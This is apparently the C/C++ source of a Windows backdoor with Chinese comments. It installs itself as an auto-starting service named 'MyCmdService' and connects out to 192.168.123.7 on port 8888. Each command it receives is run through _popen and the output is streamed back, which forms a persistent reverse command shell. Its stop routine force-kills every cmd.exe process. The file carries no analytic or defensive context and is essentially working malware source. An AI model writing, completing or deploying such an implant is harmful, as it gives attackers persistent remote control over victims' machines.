#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
void cmd(char *command, SOCKET s);
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD controlCode);

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    g_StatusHandle = RegisterServiceCtrlHandler(TEXT("MyCmdService"), ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        // 处理注册服务控制处理程序失败的情况
        return;
    }

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (g_ServiceStopEvent == NULL)
    {
        // 处理创建服务停止事件失败的情况
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // 连接到服务器
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData); // 初始化Winsock库

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0); // 创建套接字
    if (clientSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "Error creating socket\n");
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;                         // 地址族
    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7"); // 服务器IP地址
    serverAddr.sin_port = htons(8888);                       // 服务器端口号
    int result;
    if (connect(clientSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    { // 连接到服务器
        fprintf(stderr, "Error connecting to server\n");
        closesocket(clientSocket);
        Sleep(1000);                                    // 等待一段时间后重试
        clientSocket = socket(AF_INET, SOCK_STREAM, 0); // 重新创建套接字
        if (clientSocket == INVALID_SOCKET)
        {
            fprintf(stderr, "Error creating socket\n");
        }
    }
    else
    {
        // 连接成功，进行后续操作
        char buffer[1024];
        int bytesReceived;
        send(clientSocket, "run", 4, 0);

        while (1)
        {
            bytesReceived = recv(clientSocket, buffer, 1024, 0); // 接收服务端的消息
            if (bytesReceived > 0)
            {
                buffer[bytesReceived] = '\0';
                if (strcmp(buffer, "exit") == 0)
                {
                    break;
                }
                cmd(buffer, clientSocket);
            }
            else if (bytesReceived == 0)
            {
                printf("Server disconnected\n");
                break;
            }
            else
            {
                fprintf(stderr, "Error receiving data\n");
                break;
            }
        }
    }

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // 等待服务停止事件被触发
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    WSACleanup(); // 清理Winsock库
}

void WINAPI ServiceCtrlHandler(DWORD controlCode)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        system("taskkill /IM cmd.exe /F");
        SetEvent(g_ServiceStopEvent);
        break;
    }
}

void sendChunkedData(SOCKET s, const char *data, int length)
{
    int totalSent = 0;
    int bytesLeft = length;
    int bytesSent;

    while (totalSent < length)
    {
        bytesSent = send(s, data + totalSent, bytesLeft, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            fprintf(stderr, "Error sending data\n");
            break;
        }
        totalSent += bytesSent;
        bytesLeft -= bytesSent;
    }
}

void cmd(char *command, SOCKET s)
{
    printf("%s is run\n", command);

    FILE *fp = _popen(command, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Error executing command\n");
        return;
    }

    char buffer[4096];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fp)) > 0)
    {
        sendChunkedData(s, buffer, bytesRead);
        fwrite(buffer, 1, bytesRead, stdout);
    }

    _pclose(fp);
}

int main()
{
    // 服务安装代码
    SC_HANDLE schSCManager;
    SC_HANDLE schService;

    schSCManager = OpenSCManager(
        NULL,                   // local computer
        NULL,                   // ServicesActive database
        SC_MANAGER_ALL_ACCESS); // full access rights

    schService = OpenService(
        schSCManager,           // SCManager database
        TEXT("MyCmdService"),   // name of service
        SERVICE_CHANGE_CONFIG); // need change config access

    ChangeServiceConfig(
        schService,         // handle of service
        SERVICE_NO_CHANGE,  // service type: no change
        SERVICE_AUTO_START, // service start type
        SERVICE_NO_CHANGE,  // error control type
        NULL,               // binary path name
        NULL,               // load order group
        NULL,               // tag ID
        NULL,               // dependencies
        NULL,               // account name
        NULL,               // password
        NULL);              // display name

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    // 服务启动代码
    LPCTSTR serviceName = TEXT("MyCmdService");
    LPHANDLER_FUNCTION_EX serviceCtrlHandler = reinterpret_cast<LPHANDLER_FUNCTION_EX>(ServiceCtrlHandler);

    SERVICE_TABLE_ENTRY serviceTable[] = {
        {const_cast<LPTSTR>(serviceName), ServiceMain},
        {NULL, NULL}};

    if (!StartServiceCtrlDispatcher(serviceTable))
    {
        // 处理注册服务失败的情况
    }

    return 0;
}
